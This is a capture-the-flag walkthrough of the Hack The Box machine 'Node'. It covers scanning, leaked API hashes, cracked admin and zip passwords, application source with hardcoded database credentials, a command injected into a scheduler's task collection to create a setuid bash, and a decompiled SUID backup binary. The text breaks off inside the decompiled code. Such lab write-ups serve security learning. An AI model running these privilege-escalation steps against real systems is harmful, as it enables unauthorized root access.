# Node

## Overview

This was a medium level box with lot’s of challenges.

![Node.png](uploads/Node.png)

**Name -** Node

**Difficulty -** Medium

**OS -** Linux

**Points -** 30

## Information Gathering

### **Port Scan**

Basic Scan

```bash
╭╴animesh@SiliconBits  💀  ~
╰─ nmap 10.129.252.114
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-06 19:54 Bangladesh Standard Time
Nmap scan report for 10.129.252.114
Host is up (0.22s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 64.36 seconds
```

Version Scan

```bash
╭╴animesh@SiliconBits  💀  ~ took 1m4s
╰─ nmap 10.129.252.114 -p22,3000 -sC -sV
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-06 19:56 Bangladesh Standard Time
Nmap scan report for 10.129.252.114
Host is up (1.3s latency).

PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
3000/tcp open  hadoop-datanode Apache Hadoop
|_http-title: MyPlace
| hadoop-tasktracker-info:
|_  Logs: /login
| hadoop-datanode-info:
|_  Logs: /login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.92 seconds
```

### **HTTP Enumeration**

Visiting the website gives us the following

![Untitled](uploads/Untitled.png)

I got some js files at the bottom of the source

![Untitled](uploads/Untitled%201.png)

From those js file we have recieved the following apis

```
1. /api/users/latest
2. /api/session/authenticate
3. /api/admin/backup
4. /api/session
5. /api/users/
```

And from the last api endpoint I was able to find some credentials

![Untitled](uploads/Untitled%202.png)

I searched those hashes in online database and found credentials of admin user along with 2 other user

![Untitled](uploads/Untitled%203.png)

So, the admin credential is - **myP14ceAdm1nAcc0uNT:manchester**

We found a link of backup upon logging in with the above credentials

![Untitled](uploads/Untitled%204.png)

## Getting User.txt

The file seems like a base64 encoded file

![Untitled](uploads/Untitled%205.png)

So, I decode the file and found a zip archive but unfortunately, the zip wants a password

![Untitled](uploads/Untitled%206.png)

Then, I tried to crack the zip using hashcat

![Untitled](uploads/Untitled%207.png)

So, The password for the zip is - **magicword**

After unzipping the file, I found the credentials of mark user from app.js file

```jsx
const express = require("express");
const session = require("express-session");
const bodyParser = require("body-parser");
const crypto = require("crypto");
const MongoClient = require("mongodb").MongoClient;
const ObjectID = require("mongodb").ObjectID;
const path = require("path");
const spawn = require("child_process").spawn;
const app = express();
const url =
  "mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace";
const backup_key =
  "45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474";

MongoClient.connect(url, function (error, db) {
  if (error || !db) {
    console.log("[!] Failed to connect to mongodb");
    return;
  }

  app.use(
    session({
      secret: "the boundless tendency initiates the law.",
      cookie: { maxAge: 3600000 },
      resave: false,
      saveUninitialized: false,
    })
  );

  app.use(function (req, res, next) {
    var agent = req.headers["user-agent"];
    var blacklist =
      /(DirBuster)|(Postman)|(Mozilla\/4\.0.+Windows NT 5\.1)|(Go\-http\-client)/i;

    if (!blacklist.test(agent)) {
      next();
    } else {
      count = Math.floor(Math.random() * 10000 + 1);
      randomString = "";

      var charset =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
      for (var i = 0; i < count; i++)
        randomString += charset.charAt(
          Math.floor(Math.random() * charset.length)
        );

      res
        .set("Content-Type", "text/plain")
        .status(200)
        .send(
          [
            "QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ",
            "QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ",
            "QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ",
            "QQQQQQQQQQQQQQQQQQQWQQQQQWWWBBBHHHHHHHHHBWWWQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ",
            'QQQQQQQQQQQQQQQD!`__ssaaaaaaaaaass_ass_s____.  -~""??9VWQQQQQQQQQQQQQQQQQQQ',
            "QQQQQQQQQQQQQP'_wmQQQWWBWV?GwwwmmWQmwwwwwgmZUVVHAqwaaaac,\"?9$QQQQQQQQQQQQQQ",
            "QQQQQQQQQQQW! aQWQQQQW?qw#TTSgwawwggywawwpY?T?TYTYTXmwwgZ$ma/-?4QQQQQQQQQQQ",
            "QQQQQQQQQQW' jQQQQWTqwDYauT9mmwwawww?WWWWQQQQQ@TT?TVTT9HQQQQQQw,-4QQQQQQQQQ",
            "QQQQQQQQQQ[ jQQQQQyWVw2$wWWQQQWWQWWWW7WQQQQQQQQPWWQQQWQQw7WQQQWWc)WWQQQQQQQ",
            "QQQQQQQQQf jQQQQQWWmWmmQWU???????9WWQmWQQQQQQQWjWQQQQQQQWQmQQQQWL 4QQQQQQQQ",
            'QQQQQQQP\'.yQQQQQQQQQQQP"       <wa,.!4WQQQQQQQWdWP??!"??4WWQQQWQQc ?QWQQQQQ',
            'QQQQQP\'_a.<aamQQQW!<yF "!` ..  "??$Qa "WQQQWTVP\'    "??\' =QQmWWV?46/ ?QQQQQ',
            "QQQP'sdyWQP?!`.-\"?46mQQQQQQT!mQQgaa. <wWQQWQaa _aawmWWQQQQQQQQQWP4a7g -WWQQ",
            'QQ[ j@mQP\'adQQP4ga, -????" <jQQQQQWQQQQQQQQQWW;)WQWWWW9QQP?"`  -?QzQ7L ]QQQ',
            "QW jQkQ@ jWQQD'-?$QQQQQQQQQQQQQQQQQWWQWQQQWQQQc \"4QQQQa   .QP4QQQQfWkl jQQQ",
            'QE ]QkQk $D?`  waa "?9WWQQQP??T?47`_aamQQQQQQWWQw,-?QWWQQQQQ`"QQQDQf(.QWQQ',
            'QQ,-Qm4Q/-QmQ6 "WWQma/  "??QQQQQQL 4W"- -?$QQQQWP`s,awT$QQQ@  "QW@?$:.yQQQQ',
            "QQm/-4wTQgQWQQ,  ?4WWk 4waac -???$waQQQQQQQQF??'<mWWWWWQW?^  ` ]6QQ' yQQQQQ",
            'QQQQw,-?QmWQQQQw  a,    ?QWWQQQw _.  "????9VWaamQWV???"  a j/  ]QQf jQQQQQQ',
            'QQQQQQw,"4QQQQQQm,-$Qa     ???4F jQQQQQwc <aaas _aaaaa 4QW ]E  )WQ`=QQQQQQQ',
            "QQQQQQWQ/ $QQQQQQQa ?H ]Wwa,     ???9WWWh dQWWW,=QWWU?  ?!     )WQ ]QQQQQQQ",
            "QQQQQQQQQc-QWQQQQQW6,  QWQWQQQk <c                             jWQ ]QQQQQQQ",
            'QQQQQQQQQQ,"$WQQWQQQQg,."?QQQQ\'.mQQQmaa,.,                . .; QWQ.]QQQQQQQ',
            'QQQQQQQQQWQa ?$WQQWQQQQQa,."?( mQQQQQQW[:QQQQm[ ammF jy! j( } jQQQ(:QQQQQQQ',
            'QQQQQQQQQQWWma "9gw?9gdB?QQwa, -??T$WQQ;:QQQWQ ]WWD _Qf +?! _jQQQWf QQQQQQQ',
            'QQQQQQQQQQQQQQQws "Tqau?9maZ?WQmaas,,    --~-- ---  . _ssawmQQQQQQk 3QQQQWQ',
            "QQQQQQQQQQQQQQQQWQga,-?9mwad?1wdT9WQQQQQWVVTTYY?YTVWQQQQWWD5mQQPQQQ ]QQQQQQ",
            "QQQQQQQWQQQQQQQQQQQWQQwa,-??$QwadV}<wBHHVHWWBHHUWWBVTTTV5awBQQD6QQQ ]QQQQQQ",
            'QQQQQQQQQQQQQQQQQQQQQQWWQQga,-"9$WQQmmwwmBUUHTTVWBWQQQQWVT?96aQWQQQ ]QQQQQQ',
            "QQQQQQQQQQWQQQQWQQQQQQQQQQQWQQma,-?9$QQWWQQQQQQQWmQmmmmmQWQQQQWQQW(.yQQQQQW",
            "QQQQQQQQQQQQQWQQQQQQWQQQQQQQQQQQQQga%,.  -??9$QQQQQQQQQQQWQQWQQV? sWQQQQQQQ",
            'QQQQQQQQQWQQQQQQQQQQQQQQWQQQQQQQQQQQWQQQQmywaa,;~^"!???????!^`_saQWWQQQQQQQ',
            "QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQWWWWQQQQQmwywwwwwwmQQWQQQQQQQQQQQ",
            "QQQQQQQWQQQWQQQQQQWQQQWQQQQQWQQQQQQQQQQQQQQQQWQQQQQWQQQWWWQQQQQQQQQQQQQQQWQ",
            "",
            "",
            "<!-- " + randomString + " -->",
          ].join("\n")
        );
    }
  });

  app.use(express.static(path.join(__dirname, "static")));
  app.use(bodyParser.json());
  app.use(function (err, req, res, next) {
    if (err) {
      res.status(err.status || 500);
      res.send({
        message: "Uh oh, something went wrong!",
        error: true,
      });
    } else {
      next();
    }
  });

  app.get("/api/users/?", function (req, res) {
    db.collection("users")
      .find()
      .toArray(function (error, docs) {
        if (error) {
          res.status(500).send({ error: true });
        } else if (!docs) {
          res.status(404).send({ not_found: true });
        } else {
          res.send(docs);
        }
      });
  });

  app.get("/api/users/latest", function (req, res) {
    db.collection("users")
      .find({ is_admin: false })
      .toArray(function (error, docs) {
        if (error) {
          res.status(500).send({ error: true });
        } else if (!docs) {
          res.status(404).send({ not_found: true });
        } else {
          res.send(docs);
        }
      });
  });

  app.get("/api/users/:username", function (req, res) {
    db.collection("users").findOne(
      { username: req.params.username },
      function (error, doc) {
        if (error) {
          res.status(500).send({ error: true });
        } else if (!doc) {
          res.status(404).send({ not_found: true });
        } else {
          res.send(doc);
        }
      }
    );
  });

  app.get("/api/session", function (req, res) {
    if (req.session.user) {
      res.send({
        authenticated: true,
        user: req.session.user,
      });
    } else {
      res.send({
        authenticated: false,
      });
    }
  });

  app.post("/api/session/authenticate", function (req, res) {
    var failureResult = {
      error: true,
      message: "Authentication failed",
    };

    if (!req.body.username || !req.body.password) {
      res.send(failureResult);
      return;
    }

    db.collection("users").findOne(
      { username: req.body.username },
      function (error, doc) {
        if (error) {
          res.status(500).send({
            message: "Uh oh, something went wrong!",
            error: true,
          });

          return;
        }

        if (!doc) {
          res.send(failureResult);
          return;
        }

        var hash = crypto.createHash("sha256");
        var cipherText = hash.update(req.body.password).digest("hex");

        if (cipherText == doc.password) {
          req.session.user = doc;
          res.send({
            success: true,
          });
        } else {
          res.send({
            success: false,
          });
        }
      }
    );
  });

  app.get("/api/admin/backup", function (req, res) {
    if (req.session.user && req.session.user.is_admin) {
      var proc = spawn("/usr/local/bin/backup", ["-q", backup_key, __dirname]);
      var backup = "";

      proc.on("exit", function (exitCode) {
        res.header("Content-Type", "text/plain");
        res.header(
          "Content-Disposition",
          "attachment; filename=myplace.backup"
        );
        res.send(backup);
      });

      proc.stdout.on("data", function (chunk) {
        backup += chunk;
      });

      proc.stdout.on("end", function () {});
    } else {
      res.send({
        authenticated: false,
      });
    }
  });

  app.use(function (req, res, next) {
    res.sendFile("app.html", { root: __dirname });
  });

  app.listen(3000, function () {
    console.log("MyPlace app listening on port 3000!");
  });
});
```

![Untitled](uploads/Untitled%208.png)

So, The creds are - **mark:5AYRft73VtFpc84k**

Also, I found a backup key **45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474** which I will use later.

![Untitled](uploads/Untitled%209.png)

By Running linpeas on it, I found an SUID binary **/usr/local/bin/backup**

![Untitled](uploads/Untitled%2010.png)

But, I didn’t have the privilege to execute it. I also got a suspicious process running by tom user

![Untitled](uploads/Untitled%2011.png)

The file /var/scheduler/app.js is running as tom user.

```jsx
const exec = require("child_process").exec;
const MongoClient = require("mongodb").MongoClient;
const ObjectID = require("mongodb").ObjectID;
const url =
  "mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler";

MongoClient.connect(url, function (error, db) {
  if (error || !db) {
    console.log("[!] Failed to connect to mongodb");
    return;
  }

  setInterval(function () {
    db.collection("tasks")
      .find()
      .toArray(function (error, docs) {
        if (!error && docs) {
          docs.forEach(function (doc) {
            if (doc) {
              console.log("Executing task " + doc._id + "...");
              exec(doc.cmd);
              db.collection("tasks").deleteOne({ _id: new ObjectID(doc._id) });
            }
          });
        } else if (error) {
          console.log("Something went wrong: " + error);
        }
      });
  }, 30000);
});
```

As we can see, this script is executing a function in every 30 seconds. And it is fetching each entry from tasks collection and executing it. So, If we can insert a malicious payload in the collection, Then it will execute that.

![Untitled](uploads/Untitled%2012.png)

I inserted the following payload

```jsx
db.tasks.insert({ cmd: "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" });
```

After some time, I got the setuid bash file

![Untitled](uploads/Untitled%2013.png)

And from here, I first get the flag

![Untitled](uploads/Untitled%2014.png)

User flag - 442997e53aa18d3b33d77706f6cd087d

## Getting root.txt

The problem is we are not getting the admin group, So I slightly change the payload

![Untitled](uploads/Untitled%2015.png)

Now, I am in the admin group and can run the backup binary mentioned previously. the binary requires 3 arguments

![Untitled](uploads/Untitled%2016.png)

The first argument should be “-q”, The 2nd one is the backup key “45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474” and the 3rd one is the filename. Here I wanted root.txt file. So, Let’s try that

![Untitled](uploads/Untitled%2017.png)

I tried to decrypt that, but that was giving me the following

![Untitled](uploads/Untitled%2018.png)

After that, I use ida to decompile the binary and found that it had some filters

```c
// bad sp value at call has been detected, the output may be wrong!
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  int v4; // esi
  int v5; // ebx
  int v6; // eax
  int v7; // eax
  char v9[1500]; // [esp+1h] [ebp-10B1h] BYREF
  char v10[1000]; // [esp+5DDh] [ebp-AD5h] BYREF
  char v11[500]; // [esp+9C5h] [ebp-6EDh] BYREF
  char v12[1000]; // [esp+BB9h] [ebp-4F9h] BYREF
  char v13[100]; // [esp+FA1h] [ebp-111h] BYREF
  char v14[6]; // [esp+1005h] [ebp-ADh] BYREF
  char v15[3]; // [esp+100Bh] [ebp-A7h] BYREF
  _BYTE v16[6]; // [esp+100Eh] [ebp-A4h] BYREF
  char v17[6]; // [esp+1014h] [ebp-9Eh] BYREF
  char v18[6]; // [esp+101Ah] [ebp-98h] BYREF
  __int16 v19; // [esp+1020h] [ebp-92h] BYREF
  char v20[100]; // [esp+1022h] [ebp-90h] BYREF
  int v21; // [esp+1086h] [ebp-2Ch]
  int v22; // [esp+108Ah] [ebp-28h]
  int i; // [esp+108Eh] [ebp-24h]
  int v24; // [esp+1092h] [ebp-20h]
  int v25; // [esp+1096h] [ebp-1Ch]
  int v26; // [esp+109Ah] [ebp-18h]
  int v27; // [esp+109Eh] [ebp-14h]
  int *p_argc; // [esp+10A2h] [ebp-10h]

  p_argc = &argc;
  v3 = geteuid();
  setuid(v3);
  v25 = 0;
  v24 = 0;
  if ( argc <= 3 )
    exit(1, v25, v26, v27);
  if ( strcmp(argv[1], "-q") )
  {
    puts("\n\n\n             ____________________________________________________");
    puts("            /                                                    \\");
    puts("           |    _____________________________________________     |");
    puts("           |   |                                             |    |");
    puts("           |   |                                             |    |");
    puts("           |   |                                             |    |");
    puts("           |   |                                             |    |");
    puts("           |   |                                             |    |");
    puts("           |   |                                             |    |");
    puts("           |   |             Secure Backup v1.0              |    |");
    puts("           |   |                                             |    |");
    puts("           |   |                                             |    |");
    puts("           |   |                                             |    |");
    puts("           |   |                                             |    |");
    puts("           |   |                                             |    |");
    puts("           |   |                                             |    |");
    puts("           |   |_____________________________________________|    |");
    puts("           |                                                      |");
    puts("            \\_____________________________________________________/");
    puts("                   \\_______________________________________/");
    puts("                _______________________________________________");
    puts("             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_");
    puts("          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_");
    puts("       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_");
    puts("    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_");
    puts(" _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_");
    puts(":-----------------------------------------------------------------------------:");
    puts("`---._.-----------------------------------------------------------------._.---'\n\n");
  }
  strncpy(v20, argv[2], 100);
  v19 = 47;
  strcpy(v14, "/e");
  strcpy(&v14[3], "tc");
  strcpy(v15, &v19);
  *(_WORD *)&v15[strlen(v15)] = 109;
  strcpy(v16, "yp");
  strcpy(&v16[3], "la");
  strcpy(v17, "ce");
  strcpy(&v17[3], &v19);
  *(_WORD *)&v17[strlen(&v17[3]) + 3] = 107;
  strcpy(v18, "ey");
  strcpy(&v18[3], "s");
  strcpy(v13, v14);
  for ( i = 1; i <= 8; ++i )
    strcat(v13, &v14[3 * i]);
  v22 = fopen(v13, "r");
  if ( v22 )
    goto LABEL_15;
  if ( v24 == 1 )
    displayWarning("Could not open file\n\n");
  exit(1, v25, v26, v27);
  do
  {
    v12[strcspn(v12, "\n")] = 0;
    if ( !strcmp(v20, v12) )
    {
      v25 = 1;
      if ( v24 == 1 )
        displaySuccess("Validated access token");
    }
LABEL_15:
    ;
  }
  while ( fgets(v12, 1000, v22) );
  if ( v25 != 1 )
  {
    if ( v24 == 1 )
      displayWarning("Ah-ah-ah! You didn't say the magic word!\n\n");
    exit(1, v25, v26, v27);
  }
  if ( strstr(argv[3], "..") )
  {
    displaySuccess("Finished! Encoded backup is below:\n");
    puts(
      "UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpS"
      "vYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZor"
      "Y67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207Ef"
      "D3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2"
      "EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/"
      "a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MM"
      "yU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut2"
      "2WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd2"
      "6PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJr"
      "yLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOx"
      "kDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmP"
      "aFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnict"
      "zNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBw"
      "ACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==");
    exit(0, v25, v26, v27);
  }
  if ( strstr(argv[3], "/root") )
  {
    displaySuccess("Finished! Encoded backup is below:\n");
    puts(
      "UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpS"
      "vYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZor"
      "Y67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207Ef"
      "D3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2"
      "EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/"
      "a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MM"
      "yU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut2"
      "2WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd2"
      "6PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJr"
      "yLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOx"
      "kDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmP"
      "aFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnict"
      "zNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBw"
      "ACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==");
    exit(0, v25, v26, v27);
  }
  if ( strchr(argv[3], 59) )
  {
    displaySuccess("Finished! Encoded backup is below:\n");
    puts(
      "UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpS"
      "vYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZor"
      "Y67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207Ef"
      "D3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2"
      "EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/"
      "a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MM"
      "yU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut2"
      "2WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd2"
      "6PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJr"
      "yLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOx"
      "kDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmP"
      "aFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnict"
      "zNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBw"
      "ACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==");
    exit(0, v25, v26, v27);
  }
  if ( strchr(argv[3], 38) )
  {
    displaySuccess("Finished! Encoded backup is below:\n");
    puts(
      "UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpS"
      "vYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZor"
      "Y67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207Ef"
      "D3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2"
      "EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/"
      "a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MM"
      "yU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut2"
      "2WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd2"
      "6PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJr"
